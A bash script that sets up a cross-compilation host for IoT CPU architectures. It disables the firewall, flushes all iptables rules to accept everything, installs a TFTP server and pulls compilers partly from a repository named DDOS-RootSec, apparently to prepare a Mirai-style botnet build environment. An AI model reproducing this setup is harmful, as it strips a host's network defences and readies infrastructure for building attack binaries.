#!/bin/bash

ufw disable
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT

apt update && apt install -y gcc make screen wget bzip2 tftpd-hpa

rm -rf *.deb
mkdir -p /etc/xcompile
cd /etc/xcompile

wget https://musl.cc/aarch64-linux-musl-cross.tgz
wget https://musl.cc/arm-linux-musleabi-cross.tgz -O armv4l-linux-musl-cross.tgz
wget https://musl.cc/i486-linux-musl-cross.tgz
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mips.tar.bz2
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mipsel.tar.bz2

for file in *.tgz; do
    if [ -f "$file" ]; then
        tar -xf "$file"
    fi
done

if [ -d aarch64-linux-musl-cross ]; then
    rm -rf aarch64
    mv aarch64-linux-musl-cross aarch64
fi

if [ -d arm-linux-musleabi-cross ]; then
    rm -rf armv4l
    mv arm-linux-musleabi-cross armv4l
fi

if [ -d i486-linux-musl-cross ]; then
    rm -rf i486
    mv i486-linux-musl-cross i486
fi

if [ -f cross-compiler-mips.tar.bz2 ]; then
    rm -rf mips
    mkdir -p mips && cd mips
    tar -xjf ../cross-compiler-mips.tar.bz2
    mv cross-compiler-mips/* . 2>/dev/null || true
    rmdir cross-compiler-mips 2>/dev/null || true
    cd ..
fi

if [ -f cross-compiler-mipsel.tar.bz2 ]; then
    rm -rf mipsel
    mkdir -p mipsel && cd mipsel
    tar -xjf ../cross-compiler-mipsel.tar.bz2
    mv cross-compiler-mipsel/* . 2>/dev/null || true
    rmdir cross-compiler-mipsel 2>/dev/null || true
    cd ..
fi

rm -rf *.tgz *.tar.gz *.tar.xz *.bz2 2>/dev/null

export PATH=/etc/xcompile/aarch64/bin:$PATH
export PATH=/etc/xcompile/armv4l/bin:$PATH
export PATH=/etc/xcompile/i486/bin:$PATH
export PATH=/etc/xcompile/mips/bin:$PATH
export PATH=/etc/xcompile/mipsel/bin:$PATH

for d in aarch64 armv4l i486 mips mipsel; do
    echo "export PATH=/etc/xcompile/$d/bin:\$PATH" >> ~/.bashrc
    if [ -d "/etc/xcompile/$d/bin" ]; then
        for bin in /etc/xcompile/$d/bin/*; do
            [ -f "$bin" ] && sudo ln -sf "$bin" /usr/local/bin/$(basename "$bin") 2>/dev/null
        done
    fi
done

if [ -n "$BASH_VERSION" ]; then
    source ~/.bashrc
else
    . ~/.bashrc
fi

echo "========================================"
echo "DONE! Musl compilers installed."
echo "========================================"
echo "Compilers installed:"
ls -la /etc/xcompile/
